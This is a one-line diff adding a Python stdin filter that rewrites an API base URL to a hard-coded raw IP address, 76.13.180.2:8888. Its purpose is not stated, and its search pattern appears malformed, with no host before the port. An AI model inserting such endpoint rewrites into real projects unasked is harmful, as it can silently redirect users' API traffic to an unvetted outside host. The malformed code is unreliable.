@@ -1,0 +1,1 @@
+import sys; c=sys.stdin.read().replace('http://' + r'\:8080/api/v1', 'http://76.13.180.2:8888/api/v1'); sys.stdout.write(c)
